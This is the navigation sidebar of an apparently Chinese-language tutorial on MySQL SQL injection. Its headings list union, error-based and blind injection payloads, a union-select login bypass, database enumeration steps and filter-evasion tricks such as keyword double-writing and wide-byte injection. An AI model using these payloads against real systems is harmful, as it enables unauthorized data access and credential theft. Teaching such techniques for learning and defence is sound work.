class="nav-number">1.2.2.1.</span> <span class="nav-text">示例代码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#对于一个web应用来说就是当sql语句执行成功时返回一个标志，执行失败时返回另一个标志-例如：上面的代码模拟了一个应用的登陆处理，成功时返回success，失败时返回fail-，但是这个返回的标志不是sql语句执行的结果，通常遇到这种无回显的注入我们用报错注入和盲注。"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">对于一个web应用来说就是当sql语句执行成功时返回一个标志，执行失败时返回另一个标志(例如：上面的代码模拟了一个应用的登陆处理，成功时返回success，失败时返回fail)，但是这个返回的标志不是sql语句执行的结果，通常遇到这种无回显的注入我们用报错注入和盲注。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#报错注入"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#报错注入就是有些函数会将其参数的结果包含在其报错信息中，通常我们利用这一个特性在其参数中放入我们想要得到的数据，一般使用子查询的方式实现，然后使其报错得到信息，例如"><span class="nav-number">1.2.2.4.</span> <span class="nav-text">报错注入就是有些函数会将其参数的结果包含在其报错信息中，通常我们利用这一个特性在其参数中放入我们想要得到的数据，一般使用子查询的方式实现，然后使其报错得到信息，例如:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面的exp没有报错出我们user-的数据可能是我mysql的原因-我的版本mysql-8-0-18-。"><span class="nav-number">1.2.2.5.</span> <span class="nav-text">上面的exp没有报错出我们user()的数据可能是我mysql的原因(我的版本mysql-8.0.18)。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#盲注"><span class="nav-number">1.2.2.6.</span> <span class="nav-text">盲注</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果web应用设置了不能纰漏报错的数据，而且不能直接返回sql的执行结果，那么盲注就成了唯一的选择，盲注也有两种方式时间盲注和bool盲注。"><span class="nav-number">1.2.2.7.</span> <span class="nav-text">如果web应用设置了不能纰漏报错的数据，而且不能直接返回sql的执行结果，那么盲注就成了唯一的选择，盲注也有两种方式时间盲注和bool盲注。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#bool盲注"><span class="nav-number">1.2.2.8.</span> <span class="nav-text">bool盲注</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#名如其曰就是通过对真假条件的判断-真假条件返回的内容要容易区分-来进行注入的方式。"><span class="nav-number">1.2.2.9.</span> <span class="nav-text">名如其曰就是通过对真假条件的判断(真假条件返回的内容要容易区分)来进行注入的方式。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如，我们正常的sql语句是select-username-password-from-users-where-u-id-39-4411-39-，我们都知道where的后面是条件那么我们在加一个条件对比一下："><span class="nav-number">1.2.2.10.</span> <span class="nav-text">例如，我们正常的sql语句是select username,password from users where u_id=&#39;4411&#39;;，我们都知道where的后面是条件那么我们在加一个条件对比一下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可以看到当where后面的条件为假时，返回的结果空，如果真假条件返回的内容在页面上容易区分的话我们可以使用bool盲注。"><span class="nav-number">1.2.2.11.</span> <span class="nav-text">可以看到当where后面的条件为假时，返回的结果空，如果真假条件返回的内容在页面上容易区分的话我们可以使用bool盲注。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例句：-where-and-or-amp-amp-if-substr-select-password-from-users-where-username-39-admin-39-1-1-39-a-39-1-0-1-0-。"><span class="nav-number">1.2.2.12.</span> <span class="nav-text">例句：(where | and | or| || | &amp;&amp; | ^) if(substr((select password from users where username=&#39;admin&#39;),1,1)=&#39;a&#39;,1,0)(^1 | ^0);。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#时间盲注"><span class="nav-number">1.2.2.13.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#对于时间盲注而言是通过页面返回的延迟的时间来判断条件是否正确。简单来说就是我们自定义的条件为假的时候，我们设置延迟时间为0，如果条件为真，使用benchmark和sleep等函数，让sql语句执行产生延迟，例如："><span class="nav-number">1.2.2.14.</span> <span class="nav-text">对于时间盲注而言是通过页面返回的延迟的时间来判断条件是否正确。简单来说就是我们自定义的条件为假的时候，我们设置延迟时间为0，如果条件为真，使用benchmark和sleep等函数，让sql语句执行产生延迟，例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例句：-and-other-if-substr-select-password-from-users-where-username-39-admin-39-1-1-39-a-39-sleep-3-1"><span class="nav-number">1.2.2.15.</span> <span class="nav-text">例句：(and | other) if(substr((select password from users where username=&#39;admin&#39;),1,1)=&#39;a&#39;,sleep(3),1);</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#小结："><span class="nav-number">1.2.2.16.</span> <span class="nav-text">小结：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#常见注入方法有三种：联合查询注入，报错注入，盲注，其中："><span class="nav-number">1.2.2.17.</span> <span class="nav-text">常见注入方法有三种：联合查询注入，报错注入，盲注，其中：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#对于时间成本来说：联合查询注入-lt-报错注入-lt-lt-盲注。"><span class="nav-number">1.2.2.18.</span> <span class="nav-text">对于时间成本来说：联合查询注入&lt;报错注入&lt;&lt;盲注。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通常情况下，盲注需要一个一个字符的进行判断。这极大的增加了时间成本，况且对于时间盲注来说，还需要额外的延迟时间来作为判断的标准。"><span class="nav-number">1.2.2.19.</span> <span class="nav-text">通常情况下，盲注需要一个一个字符的进行判断。这极大的增加了时间成本，况且对于时间盲注来说，还需要额外的延迟时间来作为判断的标准。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-三大注入的基本步骤"><span class="nav-number">1.2.3.</span> <span class="nav-text">3.三大注入的基本步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#联合查询注入步骤"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">联合查询注入步骤</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1）首先，先确定字段数量。"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">1）首先，先确定字段数量。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#使用order-group-by语句。通过往后拼接数字，可确定字段数量，若拼接字段数大于原字段数，则页面错误-无内容，若拼接的字段数小于-等于，则页面正常。若错误页与正常页一样，更换报错注入-盲注，例如："><span class="nav-number">1.2.3.3.</span> <span class="nav-text">使用order/group by语句。通过往后拼接数字，可确定字段数量，若拼接字段数大于原字段数，则页面错误/无内容，若拼接的字段数小于/等于，则页面正常。若错误页与正常页一样，更换报错注入/盲注，例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2）第二步，判断页面回显数据的字段位置。"><span class="nav-number">1.2.3.4.</span> <span class="nav-text">2）第二步，判断页面回显数据的字段位置。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#使用and-union-select-1-2-3-4-x-我们定义的数字将显示在页面上，即可从中判断页面显示的字段位置。"><span class="nav-number">1.2.3.5.</span> <span class="nav-text">使用and union select 1,2,3,4,x...我们定义的数字将显示在页面上，即可从中判断页面显示的字段位置。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#注意："><span class="nav-number">1.2.3.6.</span> <span class="nav-text">注意：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-第三步，在显示的字段位置使用子查询来查询数据，或直接查询也可。"><span class="nav-number">1.2.3.7.</span> <span class="nav-text">3) 第三步，在显示的字段位置使用子查询来查询数据，或直接查询也可。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#首先，查询当前数据库名database-、数据库账号user-、数据库版本version-等基本情况，再根据不同的版本、不同的权限确定接下来的方法。"><span class="nav-number">1.2.3.8.</span> <span class="nav-text">首先，查询当前数据库名database()、数据库账号user()、数据库版本version()等基本情况，再根据不同的版本、不同的权限确定接下来的方法。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#若Mysql版本-lt-5-0"><span class="nav-number">1.2.3.9.</span> <span class="nav-text">若Mysql版本&lt;5.0</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#简单的说，由于mysql的低版本缺乏系统库information-schema，故通常情况下，我们无法直接查询表名，字段-列-名等信息，这时候只能靠猜来解决。"><span class="nav-number">1.2.3.10.</span> <span class="nav-text">简单的说，由于mysql的低版本缺乏系统库information_schema，故通常情况下，我们无法直接查询表名，字段(列)名等信息，这时候只能靠猜来解决。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据。"><span class="nav-number">1.2.3.11.</span> <span class="nav-text">直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#若知道仅表名而不知道列-字段-名："><span class="nav-number">1.2.3.12.</span> <span class="nav-text">若知道仅表名而不知道列(字段)名：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可通过以下payload："><span class="nav-number">1.2.3.13.</span> <span class="nav-text">可通过以下payload：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#若Mysql版本-gt-5-0"><span class="nav-number">1.2.3.14.</span> <span class="nav-text">若Mysql版本&gt;=5.0</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#首先去一个名为information-schema的数据库里的shemata数据表查询全部数据库名。"><span class="nav-number">1.2.3.15.</span> <span class="nav-text">首先去一个名为information_schema的数据库里的shemata数据表查询全部数据库名。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#若不需要跨数据库的话，可直接跳过此步骤，直接查询相应的数据库下的全部数据表名。"><span class="nav-number">1.2.3.16.</span> <span class="nav-text">若不需要跨数据库的话，可直接跳过此步骤，直接查询相应的数据库下的全部数据表名。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在information-schema的一个名为tables的数据表中存着全部的数据表信息。"><span class="nav-number">1.2.3.17.</span> <span class="nav-text">在information_schema的一个名为tables的数据表中存着全部的数据表信息。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#其中，table-name字段保存其名称，table-schema保存其对应的数据库名。"><span class="nav-number">1.2.3.18.</span> <span class="nav-text">其中，table_name字段保存其名称，table_schema保存其对应的数据库名。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#示例如下："><span class="nav-number">1.2.3.19.</span> <span class="nav-text">示例如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上述payload可查看全部的数据表名，其中group-concat函数将多行数据转成一行数据。"><span class="nav-number">1.2.3.20.</span> <span class="nav-text">上述payload可查看全部的数据表名，其中group_concat函数将多行数据转成一行数据。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#接着通过其表名，查询该表的所有字段名，有时也称列名。"><span class="nav-number">1.2.3.21.</span> <span class="nav-text">接着通过其表名，查询该表的所有字段名，有时也称列名。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通过information-schema库下的columns表可查询对应的数据库-数据库表含有的字段名。"><span class="nav-number">1.2.3.22.</span> <span class="nav-text">通过information_schema库下的columns表可查询对应的数据库/数据库表含有的字段名。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#示例如下：-1"><span class="nav-number">1.2.3.23.</span> <span class="nav-text">示例如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#知道了想要的数据存放的数据库，数据表，直接联合查询，payload如下："><span class="nav-number">1.2.3.24.</span> <span class="nav-text">知道了想要的数据存放的数据库，数据表，直接联合查询，payload如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如："><span class="nav-number">1.2.3.25.</span> <span class="nav-text">例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#简单的说就是，查库名-gt-查表名-gt-查字段名-gt-查数据。"><span class="nav-number">1.2.3.26.</span> <span class="nav-text">简单的说就是，查库名-&gt;查表名-&gt;查字段名-&gt;查数据。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-盲注步骤"><span class="nav-number">1.2.4.</span> <span class="nav-text">4.盲注步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#核心：利用逻辑代数连接词-条件函数，让页面返回的内容-响应时间与正常的页面不符。"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">核心：利用逻辑代数连接词/条件函数，让页面返回的内容/响应时间与正常的页面不符。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#bool盲注-1"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">bool盲注</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#首先通过页面对于永真条件or-1-1与永假条件and-1-2的返回内容是否存在差异进行判断是否可以进行布尔盲注。"><span class="nav-number">1.2.4.3.</span> <span class="nav-text">首先通过页面对于永真条件or 1=1与永假条件and 1=2的返回内容是否存在差异进行判断是否可以进行布尔盲注。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如：select-from-users-where-username-username，其作用设定为判断用户名是否存在。"><span class="nav-number">1.2.4.4.</span> <span class="nav-text">如：select * from users where username=$username，其作用设定为判断用户名是否存在。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通常仅返回存在-不存在，两个结果。"><span class="nav-number">1.2.4.5.</span> <span class="nav-text">通常仅返回存在/不存在，两个结果。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这时候我们就不能使用联合查询法注入，因为页面不显示SQL语句返回的内容，只能使用盲注法-报错注入法来注出数据。"><span class="nav-number">1.2.4.6.</span> <span class="nav-text">这时候我们就不能使用联合查询法注入，因为页面不显示SQL语句返回的内容，只能使用盲注法/报错注入法来注出数据。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们在将语句注入成：select-from-users-where-username-username-or-condition"><span class="nav-number">1.2.4.7.</span> <span class="nav-text">我们在将语句注入成：select * from users where username=$username or (condition)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#若后边拼接的条件为真的话，那么整条语句的where区域将变成永真条件。"><span class="nav-number">1.2.4.8.</span> <span class="nav-text">若后边拼接的条件为真的话，那么整条语句的where区域将变成永真条件。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#那么，即使我们在-username处输入的用户名为一个铁定不存在的用户名，那么返回的结果也仍然为存在。"><span class="nav-number">1.2.4.9.</span> <span class="nav-text">那么，即使我们在$username处输入的用户名为一个铁定不存在的用户名，那么返回的结果也仍然为存在。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#利用这一特性，我们的condition为：length-database-gt-8-即可用于判断数据库名长度"><span class="nav-number">1.2.4.10.</span> <span class="nav-text">利用这一特性，我们的condition为：length(database())&gt;8 即可用于判断数据库名长度</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#除此之外，还可：ascii-substr-database-1-1-lt-130-用二分法快速获取数据名-逐字判断"><span class="nav-number">1.2.4.11.</span> <span class="nav-text">除此之外，还可：ascii(substr(database(),1,1))&lt;130 用二分法快速获取数据名(逐字判断)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#payload如下："><span class="nav-number">1.2.4.12.</span> <span class="nav-text">payload如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#示例："><span class="nav-number">1.2.4.13.</span> <span class="nav-text">示例：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#时间盲注-1"><span class="nav-number">1.2.4.14.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通过判断页面返回内容的响应时间差异进行条件判断。"><span class="nav-number">1.2.4.15.</span> <span class="nav-text">通过判断页面返回内容的响应时间差异进行条件判断。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通常可利用的产生时间延迟的函数有：sleep-、benchmark-，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、GET-LOCK双SESSION产生延迟等方法。"><span class="nav-number">1.2.4.16.</span> <span class="nav-text">通常可利用的产生时间延迟的函数有：sleep()、benchmark()，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、GET_LOCK双SESSION产生延迟等方法。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如上述例子：若服务器在执行永真-永假条件并不直接返回两个容易区分的内容时，利用时间盲注或许是个更好的办法。"><span class="nav-number">1.2.4.17.</span> <span class="nav-text">如上述例子：若服务器在执行永真/永假条件并不直接返回两个容易区分的内容时，利用时间盲注或许是个更好的办法。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在上述语句中，我们拼接语句，变成："><span class="nav-number">1.2.4.18.</span> <span class="nav-text">在上述语句中，我们拼接语句，变成：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如：-1"><span class="nav-number">1.2.4.19.</span> <span class="nav-text">例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果数据库名的长度大于8，那么if条件将执行sleep-3-，那么此条语句将进行延迟3秒的操作。"><span class="nav-number">1.2.4.20.</span> <span class="nav-text">如果数据库名的长度大于8，那么if条件将执行sleep(3)，那么此条语句将进行延迟3秒的操作。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#若小于或等于8，则if条件直接返回1，并与前边的逻辑连接词拼接，无延迟直接返回。通常的响应时间在0-1秒之内，与上种情况具有很容易区分的结果，可做条件判断的依据。"><span class="nav-number">1.2.4.21.</span> <span class="nav-text">若小于或等于8，则if条件直接返回1，并与前边的逻辑连接词拼接，无延迟直接返回。通常的响应时间在0-1秒之内，与上种情况具有很容易区分的结果，可做条件判断的依据。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-报错注入步骤"><span class="nav-number">1.2.5.</span> <span class="nav-text">5.报错注入步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#通过特殊函数的错误使用使其参数被页面输出。"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">通过特殊函数的错误使用使其参数被页面输出。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#常见的利用函数有：exp-、floor-rand-、updatexml-、extractvalue-等"><span class="nav-number">1.2.5.3.</span> <span class="nav-text">常见的利用函数有：exp()、floor()+rand()、updatexml()、extractvalue()等</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如：select-from-users-where-username-username-and-or-updatexml-1-concat-0x7e-select-user-0x7e-1-。"><span class="nav-number">1.2.5.4.</span> <span class="nav-text">如：select * from users where username=$username (and | or) updatexml(1,concat(0x7e,(select user()),0x7e),1)。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#示例：-1"><span class="nav-number">1.2.5.5.</span> <span class="nav-text">示例：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因为updatexml函数的第二个参数需要满足xpath格式，我们在其前后添加字符-，使其不满足xpath格式，进行报错并输出。"><span class="nav-number">1.2.5.6.</span> <span class="nav-text">因为updatexml函数的第二个参数需要满足xpath格式，我们在其前后添加字符~，使其不满足xpath格式，进行报错并输出。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#将上述payload的-select-user-当做联合查询法的注入位置，接下来的操作与联合查询法一样。"><span class="nav-number">1.2.5.7.</span> <span class="nav-text">将上述payload的(select user())当做联合查询法的注入位置，接下来的操作与联合查询法一样。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#注意：-1"><span class="nav-number">1.2.5.8.</span> <span class="nav-text">注意：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-增、删、改"><span class="nav-number">1.3.</span> <span class="nav-text">0x03.增、删、改</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#可简单当做无回显的Select语句进行注入。值得注意的是，通常增insert处的注入点在测试时会产生大量的垃圾数据，删delete处的注入千万要注意where条件不要为永真。"><span class="nav-number">1.3.0.1.</span> <span class="nav-text">可简单当做无回显的Select语句进行注入。值得注意的是，通常增insert处的注入点在测试时会产生大量的垃圾数据，删delete处的注入千万要注意where条件不要为永真。</span></a></li></ol></li></ol><li class="nav-item nav-level-3"><a class="nav-link" href="#Mysql注入-进阶"><span class="nav-number">2.</span> <span class="nav-text">Mysql注入-进阶</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-常见的防御手段绕过"><span class="nav-number">2.1.</span> <span class="nav-text">0x04.常见的防御手段绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#在讲绕过之前，我认为有必要先讲讲什么是：过滤与拦截。"><span class="nav-number">2.1.0.1.</span> <span class="nav-text">在讲绕过之前，我认为有必要先讲讲什么是：过滤与拦截。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#简单的说就是：过滤指的是，我们输入的部分内容在拼接SQL语句之前被程序删除掉了，接着将过滤之后的内容拼接到SQL语句并继续与数据库通信。而拦截指的是：若检测到指定的内容存在，则直接返回拦截页面，同时不会进行拼接SQL语句并与数据库通信的操作。"><span class="nav-number">2.1.0.2.</span> <span class="nav-text">简单的说就是：过滤指的是，我们输入的部分内容在拼接SQL语句之前被程序删除掉了，接着将过滤之后的内容拼接到SQL语句并继续与数据库通信。而拦截指的是：若检测到指定的内容存在，则直接返回拦截页面，同时不会进行拼接SQL语句并与数据库通信的操作。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#若程序设置的是过滤，则若过滤的字符不为单字符，则可以使用双写绕过。"><span class="nav-number">2.1.0.3.</span> <span class="nav-text">若程序设置的是过滤，则若过滤的字符不为单字符，则可以使用双写绕过。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#举个例子：程序过滤掉了union这一关键词，我们可以使用ununionion来绕过。"><span class="nav-number">2.1.0.4.</span> <span class="nav-text">举个例子：程序过滤掉了union这一关键词，我们可以使用ununionion来绕过。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#PS：一般检测方法都是利用的正则，注意观察正则匹配时，是否忽略大小写匹配，若不忽略，直接使用大小写混搭即可绕过。"><span class="nav-number">2.1.0.5.</span> <span class="nav-text">PS：一般检测方法都是利用的正则，注意观察正则匹配时，是否忽略大小写匹配，若不忽略，直接使用大小写混搭即可绕过。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-and-or-被过滤-拦截"><span class="nav-number">2.1.1.</span> <span class="nav-text">2.and/or 被过滤/拦截</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-空格被过滤-拦截"><span class="nav-number">2.1.2.</span> <span class="nav-text">3.空格被过滤/拦截</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#如：select-from-user-where-username-39-admin-39-union-select-title-content-from-article-where-id-39-1-39-and-1-1"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">如：select * from user where username=&#39;admin&#39;union(select+title,content/**/from/*!article*/where/**/id=&#39;1&#39;and!!!!~~1=1)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如：-2"><span class="nav-number">2.1.2.2.</span> <span class="nav-text">例如：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-括号被过滤-拦截"><span class="nav-number">2.1.3.</span> <span class="nav-text">4.括号被过滤/拦截</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-利用场景"><span class="nav-number">2.1.3.1.</span> <span class="nav-text">1)利用场景</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#登录代码："><span class="nav-number">2.1.3.2.</span> <span class="nav-text">登录代码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#有下列表："><span class="nav-number">2.1.3.3.</span> <span class="nav-text">有下列表：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这样一个一般的场景，用户登录时，用户名错误提示：用户名错误，用户名正确密码错误提示：密码错误"><span class="nav-number">2.1.3.4.</span> <span class="nav-text">这样一个一般的场景，用户登录时，用户名错误提示：用户名错误，用户名正确密码错误提示：密码错误</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-UNION-SELECT登录"><span class="nav-number">2.1.3.5.</span> <span class="nav-text">2)UNION SELECT登录</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#看到这个逻辑第一想法肯定是直接利用union-select伪造密码登录：username-39-union-select-1-39-admin-39-39-c4ca4238a0b923820dcc509a6f75849b-amp-password-1"><span class="nav-number">2.1.3.6.</span> <span class="nav-text">看到这个逻辑第一想法肯定是直接利用union select伪造密码登录：username=&#39; union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&amp;password=1</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是想得到password怎么办？"><span class="nav-number">2.1.3.7.</span> <span class="nav-text">但是想得到password怎么办？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-利用order-by进行盲注"><span class="nav-number">2.1.3.8.</span> <span class="nav-text">3)利用order by进行盲注</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通过逐位判断便可得到password"><span class="nav-number">2.1.3.9.</span> <span class="nav-text">通过逐位判断便可得到password</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#显然此方法在实际中使用的不多，但在一些特定的环境中也许会用到，比如实验环境，如果过滤了括号，其他盲注基本上就是废了，便可利用order-by进行注入。"><span class="nav-number">2.1.3.10.</span> <span class="nav-text">显然此方法在实际中使用的不多，但在一些特定的环境中也许会用到，比如实验环境，如果过滤了括号，其他盲注基本上就是废了，便可利用order by进行注入。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-逗号被过滤-拦截"><span class="nav-number">2.1.4.</span> <span class="nav-text">5.逗号被过滤/拦截</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-改用盲注"><span class="nav-number">2.1.4.1.</span> <span class="nav-text">1).改用盲注</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-使用join语句代替"><span class="nav-number">2.1.4.2.</span> <span class="nav-text">2).使用join语句代替</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-substr-data-from-1-for-1-相当于substr-data-1-1-、limit-9-offset-4相当于limt-9-4"><span class="nav-number">2.1.4.3.</span> <span class="nav-text">3).substr(data from 1 for 1)相当于substr(data,1,1)、limit 9 offset 4相当于limt 9,4</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如：-3"><span class="nav-number">2.1.4.4.</span> <span class="nav-text">例如：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-其他系统关键字被过滤-拦截"><span class="nav-number">2.1.5.</span> <span class="nav-text">6.其他系统关键字被过滤/拦截</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-双写绕过关键字过滤"><span class="nav-number">2.1.5.1.</span> <span class="nav-text">1).双写绕过关键字过滤</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-使用同义函数-语句代替，如if函数可用case-when-condition-then-1-else-0-end语句代替。"><span class="nav-number">2.1.5.2.</span> <span class="nav-text">2).使用同义函数/语句代替，如if函数可用case when condition then 1 else 0 end语句代替。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-单双引号被过滤-拦截-转义"><span class="nav-number">2.1.6.</span> <span class="nav-text">7.单双引号被过滤/拦截/转义</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。"><span class="nav-number">2.1.6.1.</span> <span class="nav-text">1).需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-不需要跳出单引号的情况：字符串可用十六进制表示、也可通过进制转换函数表示成其他进制。"><span class="nav-number">2.1.6.2.</span> <span class="nav-text">2).不需要跳出单引号的情况：字符串可用十六进制表示、也可通过进制转换函数表示成其他进制。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-数字被过滤-拦截"><span class="nav-number">2.1.6.3.</span> <span class="nav-text">3).数字被过滤/拦截</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下表摘自MySQL注入技巧"><span class="nav-number">2.1.6.4.</span> <span class="nav-text">下表摘自MySQL注入技巧</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x05-编码转换产生的问题"><span class="nav-number">2.2.</span> <span class="nav-text">0x05.编码转换产生的问题</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-宽字节注入"><span class="nav-number">2.2.1.</span> <span class="nav-text">1.宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#什么是宽字节注入？下面举个例子来告诉你。"><span class="nav-number">2.2.1.1.</span> <span class="nav-text">什么是宽字节注入？下面举个例子来告诉你。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#该例子与开头的很相似，只不过改变三行。"><span class="nav-number">2.2.1.2.</span> <span class="nav-text">该例子与开头的很相似，只不过改变三行。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#addslashes函数将会把POST接收到的username与password的部分字符进行转义处理。如下："><span class="nav-number">2.2.1.3.</span> <span class="nav-text">addslashes函数将会把POST接收到的username与password的部分字符进行转义处理。如下：</span></a></li><li 